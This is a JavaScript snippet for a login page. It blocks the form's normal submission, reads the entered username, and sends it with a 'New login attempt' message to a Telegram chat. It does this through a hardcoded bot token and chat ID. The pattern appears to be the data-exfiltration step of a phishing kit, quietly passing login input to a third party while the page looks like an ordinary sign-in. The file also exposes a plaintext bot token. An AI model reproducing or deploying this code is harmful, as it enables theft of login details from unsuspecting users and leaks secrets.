document.getElementById('login-form').addEventListener('submit', function(event) {
    event.preventDefault();

    const username = document.querySelector('input[name="username"]').value;

    const botToken =           "8749525098:AAGPzmRDQN-xZLhMcJ8q1BkHOMu7UdmKnVk";
    const chatId = "8459758186" ;

    const message =
        "🔔 New login attempt\n\n" +
        "Username: " + username;

    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: message
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            console.log('Telegram notification sent successfully.');
        } else {
            console.error('Telegram error:', data);
        }
    })
    .catch(error => {
        console.error('Error sending Telegram notification:', error);
    });
});
